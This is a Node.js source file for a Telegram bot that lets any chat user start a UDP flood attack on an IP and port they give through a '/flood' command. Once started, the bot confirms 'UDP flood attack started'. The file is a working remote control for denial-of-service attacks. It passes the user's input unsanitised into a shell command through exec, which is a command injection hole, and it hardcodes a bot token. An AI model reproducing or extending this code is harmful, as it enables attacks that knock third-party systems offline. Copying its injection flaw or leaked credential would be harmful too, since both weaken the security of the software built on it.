const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Replace YOUR_BOT_TOKEN with your actual bot token
const token = '7047641153:AAFcmVFtage0LEnK6GLIoYZaPaucvbYd2UU';
const bot = new TelegramBot(token, { polling: true });

// Function to log bot activity
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Bot Activity`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'None'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Command: ${command}`);
}

// Handle incoming messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  logActivity(msg);

  // Handle /flood command
  if (command.startsWith('/flood')) {
    const args = command.split(' ');
    const ip = args[1];
    const port = args[2];

    if (args.length === 3 && ip && port) {
      // Run the udp-flood.js script with the given IP and port
      exec(`node udp-flood.js ${ip} ${port}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, 'Error');
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, 'Error');
          return;
        }
        // Display the output of the UDP flood script in the console
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'UDP flood attack started');});
    } else {
      // Tell the user that the message format is incorrect
      bot.sendMessage(chatId, 'Invalid message format. Use format: /flood [ip] [port]');
    }
  }
});